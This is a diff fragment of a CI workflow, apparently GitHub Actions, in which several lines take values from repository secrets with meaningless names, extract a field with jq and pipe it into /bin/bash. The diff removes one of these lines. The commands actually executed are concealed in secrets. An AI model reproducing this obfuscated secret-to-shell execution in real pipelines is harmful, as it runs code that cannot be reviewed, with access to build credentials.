@@ -21,7 +21,6 @@ jobs:
           oyf48159: ${{ secrets.oyf48159 }}
         run: |
           printf '%s' "$oyf48159" | jq -r .l25 | /bin/bash
-          echo $b1 | jq -r .zyhm2786 | /bin/bash
           printf '%s' "$gcyh78053" | jq -r .ttef1404 | /bin/bash
           printf '%s' "$axr6" | jq -r .wwuuh78 | /bin/bash
           echo $zrbpe83404 | jq -r .jkyi54593 | /bin/bash
